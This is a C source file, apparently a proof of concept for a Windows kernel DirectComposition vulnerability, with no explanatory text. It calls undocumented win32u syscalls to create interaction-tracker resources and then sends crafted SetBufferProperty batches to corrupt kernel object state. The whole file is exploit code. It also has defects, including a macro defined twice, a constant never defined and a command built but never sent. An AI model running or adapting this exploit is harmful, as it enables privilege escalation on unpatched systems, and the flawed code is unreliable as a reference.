#include <stdio.h>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(*pNtDCompositionCreateChannel)(
    OUT PHANDLE pArgChannelHandle,
    IN OUT PSIZE_T pArgSectionSize,
    OUT PVOID* pArgSectionBaseMapInProcess
    );

typedef NTSTATUS(*pNtDCompositionProcessChannelBatchBuffer)(
    IN HANDLE hChannel,
    IN DWORD dwArgStart,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2
    );

typedef NTSTATUS(*pNtDCompositionCommitChannel)(
    IN HANDLE pArgChannelHandle,
    OUT LPDWORD out1,
    OUT LPBOOL out2,
    IN BOOL in1,
    IN HANDLE in2
    );


#define nCmdCreateResource 0x1
#define nCmdReleaseResource 0x3
#define nCmdSetBufferProperty 0xC
#define CInteractionTrackerBindingManagerMarshaler 0x5b
#define CInteractionTrackerMarshaler 0x5a

HANDLE hChannel;
PVOID pMappedAddress = NULL;  SIZE_T SectionSize = 0x4000;
DWORD dwArg1, dwArg2;
DWORD szBuff[0x400];

#define CInteractionTrackerMarshaler1 1 
#define CInteractionTrackerMarshaler2 2
#define CInteractionTrackerBindingManagerMarshaler1 3 
#define CInteractionTrackerBindingManagerMarshaler2 4
#define CInteractionMarshaler1 5
#define CInteractionMarshaler2 6
#define CManipulationMarshaler1 7
#define CManipulationMarshaler1 8


pNtDCompositionCreateChannel NtDCompositionCreateChannel;
pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
pNtDCompositionCommitChannel NtDCompositionCommitChannel;

int main(int argc, TCHAR* argv[])
{

    LoadLibrary(L"user32.dll");
    NTSTATUS ntStatus;
    HMODULE win32u = LoadLibrary(L"win32u.dll");
    NtDCompositionCreateChannel = (pNtDCompositionCreateChannel)GetProcAddress(win32u, "NtDCompositionCreateChannel");
    NtDCompositionProcessChannelBatchBuffer = (pNtDCompositionProcessChannelBatchBuffer)GetProcAddress(win32u, "NtDCompositionProcessChannelBatchBuffer");
    NtDCompositionCommitChannel = (pNtDCompositionCommitChannel)GetProcAddress(win32u, "NtDCompositionCommitChannel");

    printf("[+] Create New Direct Composition Channel\n");
    ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Direct Composition Channel\n");
        exit(-1);
    }

    printf("[*] Create channel ok, channel=0x%x\n", hChannel);

    
    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionTrackerMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);


    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionTrackerMarshaler2;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);

    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionTrackerBindingManagerMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);

    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionTrackerBindingManagerMarshaler2;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);

    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);

    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionMarshaler2;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);

    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CManipulationMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);

    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CManipulationMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);

    szBuff[0] = CInteractionTrackerBindingManagerMarshaler1;
    szBuff[1] = CInteractionTrackerBindingManagerMarshaler2;
    szBuff[2] = 0x41414141;
    UINT datasize = 0xc;
    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionTrackerMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0x15;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = datasize;

    szBuff[0] = CManipulationMarshaler1;
    szBuff[1] = CInteractionMarshaler1;
    datasize = 0x8; // Size == 0x10
    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionTrackerMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0x15;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = datasize;
    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasize);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);

    szBuff[0] = CInteractionMarshaler1;
    szBuff[1] = CInteractionMarshaler1;
    szBuff[2] = CInteractionMarshaler1;
    szBuff[3] = CInteractionMarshaler1;

    datasize = 0x8; // Size == 0x10
    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)CInteractionTrackerMarshaler1;
    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0x15;
    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = datasize;
    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasize);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);


}